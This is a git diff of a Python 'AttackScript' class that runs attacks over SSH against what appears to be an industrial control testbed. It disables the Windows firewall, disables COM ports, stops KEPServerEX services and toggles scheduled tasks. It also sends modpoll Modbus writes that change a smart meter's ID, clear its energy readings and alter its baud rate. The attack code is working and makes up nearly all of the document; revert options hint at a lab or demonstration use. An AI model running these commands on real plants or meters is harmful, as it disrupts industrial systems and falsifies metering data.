@@ -289,13 +289,12 @@ class AttackScript:
         """
         Turn off all three domains of the firewall
         """
-        # cp = run('netsh advfirewall set allprofiles state off',stdout=PIPE , shell=True)
         command_output = self.ssh_run_command("netsh advfirewall set allprofiles state off")
 
         if "Ok." in command_output:
             print("Firewall disabled successfully\nOk.\n")
         else:
-            print("Firewall failed to disable\nFail.\n")
+            raise Exception("Firewall failed to disable\nFail.\n")
 
     def disable_ssh(self) -> None:
         """
@@ -377,7 +376,6 @@ class AttackScript:
     def disable_COMPort(self, revert: bool=False) -> None:
         """
         Disable a COM port
-        # TODO: Add Exception handling
 
         Args:
             revert (bool): Revert the attack. If True, enable the COM Port
@@ -400,13 +398,14 @@ class AttackScript:
         if revert:
             enable_or_disable = "/enable-device"
         disableCOM = self.ssh_run_command(f'C:\Windows\System32\pnputil.exe {enable_or_disable} "{comPort}"')
+        self.kep_server_start()
         if "successfully" in disableCOM:
             print(disableCOM)
         else:
             print(disableCOM)
-            print(f"Device not {enable_or_disable.split('-')[0][1:]}d. \nFail.\n")
+            raise Exception(f"Device not {enable_or_disable.split('-')[0][1:]}d. \nFail.\n")
         
-        self.kep_server_start()
+        
 
     def encrypt_files(self) -> None:
         # public key
@@ -513,28 +512,35 @@ class AttackScript:
             print("File have not been encrypted.")
 
     # Run modpoll to change register 40201 to 26
-    def change_meterID(self, revert: bool=True) -> None:
+    def change_meterID(self, revert: bool=False) -> None:
         """
         Run modpoll to change register 40201 (Which handle the meter ID) to 26
         
         Args:
             revert (bool): Revert the attack. If True, change meter ID to 25
         """
-        self.kep_server_stop()
-
         executable_path = self.MODPOLL_PATH + r"\modpoll.exe"
         
-        change_meterID = "26"
+        meterID_to_change = "26"
         if revert:
-            change_meterID = "25"
+            meterID_to_change = "25"
 
-        parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-r", "201", "COM1", change_meterID]
+        baudrate = self.baudrate_check()
+        if baudrate == "0":
+            raise Exception("Unable to connect to SmartMeter")
+        
+        parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-1", "-r", "201", "COM1", meterID_to_change]
 
         # FIXME: Try except for running the executable is gone
-        print(self.ssh_run_command(f"{executable_path} {' '.join(parameters)}"))
-        self.kep_server_start()
+        modpoll_output = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
+        print(modpoll_output)
 
-        print("\nOk.\n")
+        self.kep_server_start()
+        if "[201]:" in modpoll_output:
+            print(f"Successfully changed meter ID to {meterID_to_change}")
+        else:
+            raise Exception(f"Unable to change meter ID to {meterID_to_change}")
+        
 
     def clear_energy_reading(self) -> None:
         """
@@ -542,11 +548,15 @@ class AttackScript:
         
         In full, Register 40253 clears the energy reading when writing the value "78" to it. This clears the energy reading found in address 40026
         """
-        self.kep_server_stop()
 
         executable_path = self.MODPOLL_PATH + r"\modpoll.exe"
-        check_energy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-c", "11", "-1", "-r", "26", "COM1"]
-        clear_energy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-1", "-r", "253", "COM1", "78"]
+
+        baudrate = self.baudrate_check()
+        if baudrate == "0":
+            raise Exception("Unable to connect to SmartMeter")
+
+        check_energy = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-c", "11", "-1", "-r", "26", "COM1"]
+        clear_energy = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-1", "-r", "253", "COM1", "78"]
 
         # FIXME: Try except for running the executable is gone
         print(self.ssh_run_command(f"{executable_path} {' '.join(check_energy)}"))
@@ -595,7 +605,6 @@ class AttackScript:
         Args:
             revert (bool): Revert the attack. If True, change the baudrate back to 9600.
         """
-        self.kep_server_stop()
 
         executable_path = self.MODPOLL_PATH + r"\modpoll.exe"
 
@@ -617,8 +626,7 @@ class AttackScript:
             new_baudrate = "0"
             identifyBR = "4800"
         else:
-            print("Error: Unknown baudrate", file=sys.stdout)
-            return
+            raise Exception("Error: Unknown baudrate", file=sys.stdout)
 
         print(f"Changed Current BaudRate:{current_baudrate} to {identifyBR}", file=sys.stdout)
 
@@ -651,13 +659,13 @@ class AttackScript:
                 print(f"Baudrate is not {baudrate}\n")
 
         # NOTE: The kep_server_start() is removed as commands using this function will try to start KEPServer anyways
-        print("\nOk.\n")
-
-        return found_baudrate
+        if found_baudrate != "0":
+            return found_baudrate
+        else:
+            print(baudrate_output)
+            raise Exception("Unable to connect to smartmeter")
 
     def smartmeter_get_hardware_info(self):
-        self.kep_server_stop()
-
         executable_path = self.MODPOLL_PATH + "\\modpoll.exe"
 
         baudrate = self.baudrate_check()
@@ -668,24 +676,26 @@ class AttackScript:
             parameters[9] = "9006"  # DPM33 Address for reading hardwareOutput
             hardwareOutput = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}").replace("\n", " ").split(" ")
 
-            # TODO: For "cannot be detected" stuff, raise an exception
+            error_log = ""
             if "[9005]:" in firmwareOutput:
                 firmware_index = firmwareOutput.index("[9005]:")
                 print(f"Firmware version: {firmwareOutput[firmware_index + 1]}")
             else:
-                print(f"Firmware version cannot be detected")
+                error_log = "Firmware version cannot be detected"
 
             if "[9006]:" in hardwareOutput:
                 hardware_index = hardwareOutput.index("[9006]:")
                 print(f"Hardware version: {hardwareOutput[hardware_index + 1]}")
             else:
-                print(f"Hardware version cannot be detected")
-
-            # TODO: Add try except 
+                error_log += "\nHardware version cannot be detected"
+            
+            print("\n")
             self.kep_server_start()
 
+            if error_log:
+                raise Exception(error_log)
+
         else:
-            # TODO: Add try except 
             self.kep_server_start()
             raise Exception("Unable to connect to the SmartMeter")
 
@@ -1468,14 +1478,18 @@ class AttackScript:
 
         schedules_list = ["\MoveFiles", "\KEPServerEX 6.13"]
 
+        state = "success"
         for schedule in schedules_list:
             command_output = self.ssh_run_command(f'schtasks /change /TN "{schedule}" {enable_or_disable}')
             if "SUCCESS:" in command_output:
                 print(f"Successfully {enable_or_disable[1:]} {schedule} Tasks Scheduler")
                 print("Ok.")
             else:
+                state = "fail"
                 print(f"Error trying to {enable_or_disable[1:]} {schedule} Tasks Scheduler")
-                print("Fail.")
+        
+        if state == "fail":
+            raise Exception
 
     def kep_server_stop(self, revert: bool=False) -> bool:
         """
@@ -1490,31 +1504,49 @@ class AttackScript:
         if revert:
             return self.kep_server_start()
         
-        command_output = self.ssh_run_command("sc query KEPServerEXV6")
-        if "RUNNING" in command_output:
-            print("Kepserver is running, Stopping now...")
-            command_output = self.ssh_run_command("sc stop KEPServerEXV6")
+        services = ["KEPServerEXV6", "KEPServerEXConfigAPI6", "KEPServerEXLoggerV6"]
+        services_state = [False] * len(services)
 
-            counter = 1 # Added counter to make the UI Seem more responsive
-            while "STOP_PENDING" in command_output:
-                command_output = self.ssh_run_command("sc query KEPServerEXV6")
-                if "FAILED" in command_output:
-                    print("FAILED:", "\nFail.\n")
-                    return False
-                elif "STOPPED" in command_output:
-                    print("Kepserver is stopped")
-                    return True
-                else:
-                    print(f"Kepserver is still stopping... waiting 1 more second [{counter}]")
-                    counter += 1
-                    sleep(1)
+        for service_index, service in enumerate(services):
+            command_output = self.ssh_run_command(f"sc query {service}")
+            if "RUNNING" in command_output:
+                print(f"{service} is running, stopping now...")
+                command_output = self.ssh_run_command(f"sc stop {service}")
 
-        elif "STOPPED" in command_output:
-            print("Kepserver have already stopped")
-            return True
-        else:
-            print("Something went wrong!")
-            return False
+                counter = 1 # Added counter to make the UI Seem more responsive
+                while "STOP_PENDING" in command_output:
+                    command_output = self.ssh_run_command(f"sc query {service}")
+                    if "FAILED" in command_output:
+                        print("FAILED:", "\nFail.\n")
+                        services_state[service_index] = False
+
+                    elif "STOPPED" in command_output:
+                        print(f"{service} has stopped!")
+                        services_state[service_index] = True
+                    else:
+                        print(f"{service} is still stopping... waiting 1 more second [{counter}]")
+                        counter += 1
+                        sleep(1)
+
+            elif "STOPPED" in command_output:
+                print(f"{service} has stopped!")
+                services_state[service_index] = True
+            else:
+                print(command_output)
+                print("Something went wrong!")
+                services_state[service_index] = False
+
+        print("\nCollating service status for all services...")
+        state = "success"
+        for service_index, service in enumerate(services):
+            if services_state[service_index]:
+                print(f"{service} has stopped!")
+            else:
+                state = "fail"
+                print(f"{service} has issue. Might be service not found.")
+        
+        if state == "fail":
+            raise Exception
 
     def kep_server_start(self) -> bool:
         """
@@ -1530,7 +1562,7 @@ class AttackScript:
         for service_index, service in enumerate(services):
             command_output = self.ssh_run_command(f"sc query {service}")
             if "STOPPED" in command_output:
-                print(f"{service} is stopped, starting now...")
+                print(f"{service} has stopped, starting now...")
                 command_output = self.ssh_run_command(f"sc start {service}")
 
                 counter = 1 # Added counter to make the UI Seem more responsive
@@ -1556,11 +1588,17 @@ class AttackScript:
                 print("Something went wrong!")
                 services_state[service_index] = False
 
+        print("\nCollating service status for all services...")
+        state = "success"
         for service_index, service in enumerate(services):
             if services_state[service_index]:
                 print(f"{service} is running now!")
             else:
+                state = "fail"
                 print(f"{service} is not running.")
+        
+        if state == "fail":
+            raise Exception
 
         # Functions for getting status for GUI
 
